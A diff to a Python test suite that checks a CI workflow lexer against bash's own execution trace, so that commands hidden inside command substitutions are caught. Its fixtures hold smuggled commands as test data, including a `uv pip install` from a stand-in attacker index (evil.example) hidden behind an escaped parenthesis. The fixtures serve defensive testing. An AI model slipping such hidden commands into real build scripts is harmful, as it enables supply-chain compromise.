@@ -1156,6 +1156,14 @@ def test_every_locked_package_has_a_wheel_for_every_ci_platform() -> None:
     assert workflow_grammar.uv_lock_violations(REPO_ROOT / "uv.lock") == []
 
 
+def test_the_operator_docs_install_from_the_lock_wheel_only() -> None:
+    """Operators get the same closure as CI: --require-hashes alone would build an sdist."""
+    for name in ("docs/windows-quickstart.md", "docs/installation.md"):
+        for line in (REPO_ROOT / name).read_text(encoding="utf-8").splitlines():
+            if "pip install" in line and ("--require-hashes" in line or "--no-index" in line):
+                assert "pip install --only-binary :all: " in line, (name, line)
+
+
 def test_every_npm_install_script_is_reviewed_and_none_runs() -> None:
     """Sol r8: a locked package's own install scripts; CI runs npm ci --ignore-scripts."""
     lock = json.loads(LOCK_TEXT)["packages"]
@@ -1659,30 +1667,46 @@ def test_every_locked_quickstart_install_ends_with_pip_check() -> None:
 # --- the lexer against bash itself ------------------------------------------------
 
 _VARIABLE_NAME = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)")
+_ASSIGNED = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)\+?=")
+#: A grammar word whose value bash computes: it may stand for any number of words.
+_COMPUTED = re.compile(r"\$|^<\(")
 
 
-def _first_word(word: str) -> str:
-    """A program word as both sides can compare it: an assignment by name, a path by base."""
-    assignment = re.match(r"^([A-Za-z_][A-Za-z0-9_]*)\+?=", word)
-    if assignment:
-        return assignment[1] + "="
-    return re.sub(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}", r"$\1", word).rsplit("/", 1)[-1]
-
-
-def _grammar_programs(script: str) -> set[str]:
-    programs: set[str] = set()
+def _grammar_commands(script: str) -> list[tuple[str, ...]]:
+    """Every command the grammar found, word by word; an assignment as ("NAME=",)."""
+    found: list[tuple[str, ...]] = []
     for command in split_commands(script):
-        if command.assignments:
-            programs |= {_first_word(token) for token in command.assignments}
+        found.extend((_ASSIGNED.match(token)[1] + "=",) for token in command.assignments)  # type: ignore[index]
         if command.words:
-            programs.add(_first_word(command.words[0]))
+            found.append(tuple(command.words))
             if command.words[0] == "trap" and len(command.words) > 2:
-                programs |= _grammar_programs(command.words[1])
-    return programs
+                found.extend(_grammar_commands(command.words[1]))
+    return found
 
 
-def _bash_programs(script: str, directory: Path, environment: dict[str, str]) -> set[str]:
-    """What bash runs for *script*, traced with nothing on PATH (so nothing external runs)."""
+def _words_match(expected: tuple[str, ...], traced: list[str]) -> bool:
+    """Literal words must be equal; a computed word may expand to any number of words.
+
+    The program word is compared by its last path part when the directory is
+    computed (``"$TMPDIR/venv/bin/pip"`` is ``.../pip`` whatever TMPDIR holds).
+    """
+    if not expected:
+        return not traced
+    head, rest = expected[0], expected[1:]
+    if _COMPUTED.search(head):
+        literal_tail = head.rsplit("/", 1)[-1] if "/" in head else ""
+        if literal_tail and not _COMPUTED.search(literal_tail):
+            return (
+                bool(traced)
+                and traced[0].rsplit("/", 1)[-1] == literal_tail
+                and _words_match(rest, traced[1:])
+            )
+        return any(_words_match(rest, traced[count:]) for count in range(len(traced) + 1))
+    return bool(traced) and traced[0] == head and _words_match(rest, traced[1:])
+
+
+def _bash_commands(script: str, directory: Path, environment: dict[str, str]) -> list[list[str]]:
+    """What bash runs for *script*, word by word, traced with nothing on PATH."""
     import shlex
     import subprocess
 
@@ -1703,16 +1727,24 @@ def _bash_programs(script: str, directory: Path, environment: dict[str, str]) ->
         timeout=60,
         check=False,
     )
-    programs: set[str] = set()
+    commands: list[list[str]] = []
     for line in trace.read_text(encoding="utf-8").splitlines():
         stripped = line.lstrip("+").lstrip()
         if not line.startswith("+") or not stripped:
             continue
+        assignment = _ASSIGNED.match(stripped)
+        if assignment:
+            commands.append([assignment[1] + "="])
+            continue
         words = shlex.split(stripped)
         if words[:1] in (["source"], [":"], ["case"]):  # the wrapper, set/exit stubs, case
             continue
-        programs.add(_first_word(words[0]))
-    return programs
+        commands.append(words)
+    return commands
+
+
+def _unmatched(traced: list[list[str]], expected: list[tuple[str, ...]]) -> list[list[str]]:
+    return [words for words in traced if not any(_words_match(e, words) for e in expected)]
 
 
 def _real_scripts() -> list[tuple[str, str]]:
@@ -1742,25 +1774,59 @@ _POSIX_BASH = pytest.mark.skipif(
 def test_bash_runs_no_command_the_grammar_did_not_see(
     where: str, script: str, tmp_path: Path
 ) -> None:
-    """Sol r7 B1's class: whatever the lexer misreads, bash's own trace shows.
+    """Sol r7 B1 / DeepSeek r8 B1's class: whatever the lexer misreads, bash's trace shows.
 
     Each accepted script runs under ``bash -x`` with an empty PATH (every external
     command fails to start, after being traced) and ``set``/``exit`` disabled so the
     trace keeps going; both arms of the smoke script's hand-off branches are taken.
-    Every command bash reaches, substitutions included, must be one the grammar found.
+    Every command bash reaches, substitutions included, must equal one the grammar
+    found word for word (a computed word standing for whatever it expands to), so a
+    hidden `uv pip install` is caught even where the step legitimately runs `uv`.
     """
-    expected = _grammar_programs(script)
+    expected = _grammar_commands(script)
     names = set(_VARIABLE_NAME.findall(script)) - {"PATH", "BASH_XTRACEFD"}
     for variant in (names, {name for name in names if not name.startswith("GPO_STUDIO_")}):
         environment = {name: f"${name}" for name in variant}
-        traced = _bash_programs(script, tmp_path, environment)
-        assert traced <= expected, (where, sorted(traced - expected))
+        traced = _bash_commands(script, tmp_path, environment)
+        assert traced, where
+        assert _unmatched(traced, expected) == [], where
+
+
+HIDDEN_BY_A_MISREAD = {
+    # Sol r7 B1: a `)` on a comment line inside $(...).
+    "comment_paren": ('echo "$(\n# )\npip --version\n)"\n', "comment syntax", ["pip", "--version"]),
+    # DeepSeek r8 B1, verbatim: an escaped `)` inside a double-quoted $(...).
+    "escaped_paren": (
+        'echo "$(\necho hi \\)\nevilprog --install\n)"\n',
+        "backslash escape",
+        ["evilprog", "--install"],
+    ),
+    # DeepSeek r8, the name-coincident payload a name-only comparison missed.
+    "escaped_paren_same_program": (
+        'echo "$(\necho hi \\)\nuv pip install evil --index-url https://evil.example/simple\n)"\n'
+        "uv run --locked ruff check .\n",
+        "backslash escape",
+        ["uv", "pip", "install", "evil", "--index-url", "https://evil.example/simple"],
+    ),
+}
 
 
 @_POSIX_BASH
-def test_the_bash_trace_sees_what_a_misreading_lexer_would_miss(tmp_path: Path) -> None:
-    """The control, on Sol r7's exact script: bash runs `pip`, and the grammar refuses it."""
-    script = 'echo "$(\n# )\npip --version\n)"\n'
-    assert "pip" in _bash_programs(script, tmp_path, {})
-    with pytest.raises(workflow_grammar.GrammarError, match="comment syntax"):
+@pytest.mark.parametrize("name", sorted(HIDDEN_BY_A_MISREAD))
+def test_the_bash_trace_sees_what_a_misreading_lexer_would_miss(name: str, tmp_path: Path) -> None:
+    """The control: bash reaches the hidden command, the grammar refuses the script, and
+    the word-for-word comparison flags it even against what a misreading lexer saw."""
+    script, refusal, hidden = HIDDEN_BY_A_MISREAD[name]
+    traced = _bash_commands(script, tmp_path, {})
+    assert hidden in traced
+    with pytest.raises(workflow_grammar.GrammarError, match=refusal):
         split_commands(script)
+    misread = [("echo", '"$(...)"'), ("uv", "run", "--locked", "ruff", "check", ".")]
+    assert hidden in _unmatched(traced, misread)
+
+
+def test_no_substitution_hides_in_an_echo_slot(tmp_path: Path) -> None:
+    """Strict default: a substitution in echo text is a literal template or refused."""
+    for text in ('echo "$(uv sync --locked --extra dev)"', "echo <(true)", 'echo "$[1+1]"'):
+        assert _verdict(tmp_path, f"      - run: {text}"), text
+    assert _verdict(tmp_path, '      - run: echo "plain text, $GITHUB_SHA"') == []
